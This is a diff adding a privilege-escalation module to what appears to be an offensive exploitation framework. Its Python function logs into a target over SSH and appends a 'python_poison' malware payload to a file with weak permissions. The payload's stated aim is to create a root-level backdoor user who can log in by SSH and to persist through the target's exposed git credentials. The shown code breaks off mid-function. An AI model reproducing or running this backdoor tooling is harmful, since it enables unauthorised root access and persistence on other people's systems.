@@ -1,0 +1,41 @@
+import os
+from pathlib import Path
+import subprocess
+import paramiko
+from prompt_toolkit import prompt
+from core.commands.privilege_escalation.poison_exec_parser import PoisonExecParser
+from core.commands.run import tcve_exploit
+from core.context import Context
+
+
+@tcve_exploit("poison_exec", parser=PoisonExecParser, date="2024-08-15", categories=["privilege escalation", "linux", "local privilege escalation"])
+def main(context: Context, hostname: str, port: int, identity_file: str, username: str, passphrase: str, vulnerable_path: str, backdoor_user: str, backdoor_password: str|None):
+    """
+    Given a binary with unproper permissions, modify the binary to create:
+    
+    An user with root privileges.
+    Makes sure the new user can login through SSH connection.
+
+    Supports python files and shell scripts.
+    Persist changes into the target machine using the target git credentials if exposed
+    """
+    client = paramiko.SSHClient()
+    client.connect(
+        hostname=hostname,
+        port=port,
+        key_filename=identity_file,
+        username=username,
+        passphrase=passphrase
+    )
+    file_transport = client.open_sftp()
+    
+    encrypted_password = subprocess.check_output(f"openssl passwd -6 {backdoor_password or prompt('>> ')}")
+    
+    os.environ.setdefault("ENCRYPTED_PASS", encrypted_password.decode())
+    os.environ.setdefault("NEW_USER", backdoor_user)
+
+    with open(context.PAYLOAD_DIR / 'src/malwares/python_poison.py', "r") as malware_python:
+        with file_transport.open(vulnerable_path, "a+") as vulnerable_target:
+            file_name = Path(vulnerable_path).name
+            if file_name.endswith(".py"):
+                vulnerable_target.write(malware_python.read())
